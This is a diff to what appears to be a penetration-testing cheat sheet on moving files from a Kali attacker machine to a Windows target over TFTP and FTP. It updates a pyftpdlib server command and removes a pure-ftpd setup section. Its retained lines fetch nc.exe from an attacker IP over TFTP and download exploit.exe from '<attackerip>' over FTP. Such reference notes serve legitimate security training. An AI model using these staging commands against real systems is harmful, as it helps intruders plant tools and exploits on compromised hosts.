@@ -16,8 +16,8 @@ Windows> tftp -i 192.168.30.45 GET nc.exe
 ## On Kali install a ftp client and set a username/password
 
 ```
-apt-get install python-pyftpdlib  
-python -m pyftpdlib -p 21
+python3 -m pip install pyftpdlib  
+python3 -m pyftpdlib -p 21 -u root -P root
 ```
 
 ## on Windows
@@ -25,61 +25,10 @@ python -m pyftpdlib -p 21
 ```
 ftp <attackerip>
 > binary
+> lcd
 > get exploit.exe
 ```
 
-
-# FTP (pureftpd client on Kali)
-
-## on Kali
-
-### install ftp client
-
-```
-apt-get install pure-ftpd
-```
-
-### create a group
-
-```
-groupadd ftpgroup
-```
-
-### add a user
-
-```
-useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-```
-
-### Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/bob).
-
-```
-mkdir /root/ftphome
-```
-
-### Create a ftp-user, in our example "bob" (again you can set "-d /root/ftphome/bob/" if you wish).
-
-```
-pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/
-```
-
-### Update the ftp database after adding our new user.
-
-```
-pure-pw mkdb
-```
-
-### change ownership of the specified ftp directory (and all it's sub-direcotries) 
-
-```
-chown -R ftpuser:ftpgroup /root/ftphome
-```
-
-### restart Pure-FTPD
-
-```
-/etc/init.d/pure-ftpd restart
-```
 
 ### On Windows
 
